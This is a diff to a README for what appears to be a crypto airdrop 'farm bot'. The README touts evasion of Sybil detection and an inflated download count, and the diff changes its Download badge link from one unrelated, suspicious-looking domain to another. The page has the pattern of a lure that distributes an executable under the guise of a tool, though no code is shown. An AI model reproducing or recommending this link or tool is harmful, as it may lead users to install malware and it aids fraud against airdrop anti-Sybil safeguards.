@@ -49,7 +49,7 @@ A: Yes — randomizes patterns to avoid Sybil detection.
 
 **Monthly downloads:** 1.4m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/lzfarmbot26)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/lzfarmbot26)
 
 ---
 
